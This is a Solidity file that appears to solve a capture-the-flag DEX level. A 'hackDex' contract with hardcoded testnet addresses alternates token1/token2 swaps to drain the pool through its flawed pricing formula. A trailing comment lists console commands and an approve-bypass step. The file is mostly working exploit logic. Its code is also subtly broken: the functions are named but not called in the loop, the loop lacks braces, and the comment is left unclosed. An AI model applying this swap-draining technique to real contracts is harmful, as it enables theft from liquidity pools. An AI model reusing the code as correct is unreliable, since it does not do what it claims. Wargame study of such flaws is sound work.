// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Dex {
    address public token1;
    address public token2;
    function swap(address,address,uint) public {}
    function balanceOf(address,address) public returns (uint){}
}

contract hackDex{
    Dex originalContract = Dex(0xE93525457B76b5A6DE84B54ABe4d29B7a6Bf5Beb);
    address myAddress = 0x9eA8B00029Cf9C1B57483ecadCaFC94638fe7B17;
    function approve(address owner, address spender, uint amount) public{   
    }
    function attack() public {
        while(originalContract.balanceOf(originalContract.token2(), myAddress) < 110)
        swap1;
        swap2;
    }
    function swap1() public {
        originalContract.swap(originalContract.token1(), originalContract.token2(), originalContract.balanceOf(originalContract.token1(), myAddress));
    }
    function swap2() public {
        originalContract.swap(originalContract.token2(), originalContract.token1(), originalContract.balanceOf(originalContract.token2(), myAddress));
    }
}
/*
token1 = await contract.token1()
token2 = await contract.token2()
take contract token1 address and use deploy at address in rinkeby > use approve function with the levels contract address and large amount (need to bypass the dex contract because their approve function is flawed)
repeat for token2
await contract.swap(token1,token2, await contract.balanceOf(token1,player))
await contract.swap(token2,token1, await contract.balanceOf(token2,player))
last one needs to be:
await contract.swap(token2,token1, 45) because the contract wont have enough to give you the amount based on the formula